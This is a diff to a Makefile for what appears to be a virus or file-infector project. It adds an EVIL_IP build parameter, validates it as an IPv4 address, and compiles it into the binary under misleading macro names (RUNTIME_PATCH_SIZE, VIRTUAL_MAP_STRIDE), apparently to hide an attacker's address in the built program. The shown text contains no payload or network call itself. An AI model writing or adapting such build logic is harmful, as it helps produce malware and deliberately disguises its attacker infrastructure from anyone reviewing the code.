@@ -34,6 +34,23 @@ RM		 =	@rm -rf
 MKDIR	 =	@mkdir -p
 NASM	 =	@nasm
 
+comma := ,
+_IP_VALID := $(shell echo "$(EVIL_IP)" | awk -F. '\
+  NF==4 &&\
+  $$1>=0 && $$1<=255 &&\
+  $$2>=0 && $$2<=255 &&\
+  $$3>=0 && $$3<=255 &&\
+  $$4>=0 && $$4<=255 {print "ok"}')
+ifeq ($(EVIL_IP),)
+EVIL_IP :=
+else
+$(if $(_IP_VALID),,$(error EVIL_IP="$(EVIL_IP)" is not a valid IP address))
+EVIL_IP := RUNTIME_PATCH_SIZE($(subst .,$(comma) ,$(EVIL_IP)))
+EVIL_IP := -DVIRTUAL_MAP_STRIDE="$(EVIL_IP)"
+endif
+
+echo:
+	echo $(EVIL_IP)
 
 all: $(NAME)
 
@@ -67,6 +84,7 @@ $(ODIR)%.o:  $(SDIR)%.c $(VIRGIN)
 		-DECHIDNAE="$$ECHIDNAE" \
 		-DBUBONIK="$$BUBONIK" \
 		-DANCHOR="$$ANCHOR" \
+		$(EVIL_IP) \
 		-c $< -o $@
 
 $(VIRGIN): $(addsuffix .virgin, $(OBJS))
